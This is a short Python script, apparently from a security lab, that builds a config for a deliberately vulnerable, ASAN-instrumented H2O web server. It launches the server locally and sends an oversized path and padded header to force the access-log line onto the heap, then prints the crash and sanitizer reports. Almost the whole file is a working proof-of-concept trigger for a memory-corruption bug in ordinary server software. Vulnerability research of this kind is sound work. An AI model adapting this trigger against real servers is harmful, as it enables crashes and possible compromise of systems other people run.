#!/usr/bin/env python3
"""Throwaway: force the access-log line onto the heap via a large header RESERVE."""
import os
import socket
import subprocess
import sys
import time
import urllib.request

ROOT = "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell"
PORT = 17999
header_len = int(sys.argv[1]) if len(sys.argv) > 1 else 1200
path_len = int(sys.argv[2]) if len(sys.argv) > 2 else 10000
BIN = os.environ.get("H2O_BIN", f"{ROOT}/src/vuln/build-asan/h2o")
FORMAT = "%{pad}i %{error}x"
conf = f"{ROOT}/live/forced-heap.conf"
with open(conf, "w") as f:
    f.write(f"""listen:
  host: 127.0.0.1
  port: {PORT}
num-threads: 1
error-log: {ROOT}/live/forced-heap-error.log
hosts:
  default:
    access-log:
      path: {ROOT}/live/forced-heap-access.log
      format: '{FORMAT}'
    paths:
      /:
        redirect:
          status: 302
          internal: YES
          url: '//:'
""")
for p in (f"{ROOT}/live/forced-heap-access.log",):
    try:
        os.remove(p)
    except FileNotFoundError:
        pass
outpath = f"{ROOT}/live/forced-heap.out"
with open(outpath, "wb") as out:
    proc = subprocess.Popen(
        [BIN, "-c", conf],
        stdout=out, stderr=subprocess.STDOUT,
        env={**os.environ, "ASAN_OPTIONS": f"detect_leaks=0:abort_on_error=0:log_path={ROOT}/live/asan-forced-heap"},
    )
    for _ in range(100):
        try:
            s = socket.create_connection(("127.0.0.1", PORT), 0.2)
            s.close()
            break
        except OSError:
            time.sleep(0.1)
    else:
        print("SERVER_NOT_READY")
    req = urllib.request.Request(f"http://127.0.0.1:{PORT}/" + "A" * path_len,
                                 headers={"pad": "B" * header_len})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            print("HTTP", r.status)
    except Exception as e:
        print("REQUEST_FAILED", repr(e))
    time.sleep(1)
    print("ALIVE", proc.poll() is None, "RC", proc.poll())
    if proc.poll() is None:
        proc.kill()
    proc.wait()
print("--- server output ---")
print(open(outpath, errors="replace").read()[:2000])
import glob
for p in glob.glob(f"{ROOT}/live/asan-forced-heap.*"):
    print("--- asan report", p, "---")
    print("".join(open(p, errors="replace").readlines()[:14]))
